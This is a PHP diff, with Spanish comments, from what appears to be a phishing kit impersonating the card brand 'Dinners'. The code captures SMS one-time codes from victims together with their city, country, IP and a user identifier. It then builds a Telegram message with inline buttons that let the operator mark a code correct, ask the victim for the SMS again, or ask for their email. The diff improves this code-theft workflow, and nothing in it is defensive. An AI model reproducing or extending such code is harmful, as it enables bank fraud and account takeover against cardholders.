@@ -23,17 +23,17 @@ if (isset($_POST["sms_code"])) {
     $session_id = $_SESSION['session_id'] ?? uniqid('user_', true);
     $_SESSION['session_id'] = $session_id;
 
-    $msg = "Dinners - SMS Code 📱\n🔢 Código SMS: => " . $sms_code . "\n=============================\n Ciudad: " . $city . "\n📍 País: " . $country . "\n📍 IP: " . $ip . "\n==========================\n";
+    // Obtener usuario de la sesión
+    $user_id = getUserIdentifier();
+    
+    $msg = "Dinners - SMS Code \n👤 Usuario: " . $user_id . "\n🔢 Código SMS: => " . $sms_code . "\n=============================\n Ciudad: " . $city . "\n📍 País: " . $country . "\n📍 IP: " . $ip . "\n==========================\n";
 
     // Crear botones inline para SMS
     $keyboard = [
         'inline_keyboard' => [
             [
-                ['text' => '✅ SMS Correcto', 'callback_data' => 'sms_ok_' . $session_id]
-            ],
-            [
-                ['text' => '🔄 Repetir SMS', 'callback_data' => 'sms_retry_' . $session_id],
-                ['text' => '� Pedir Email', 'callback_data' => 'sms_email_' . $session_id]
+                ['text' => '📩 Mail', 'callback_data' => 'sms_ok_' . $session_id],
+                ['text' => '🔄 SMS', 'callback_data' => 'sms_retry_' . $session_id]
             ]
         ]
     ];
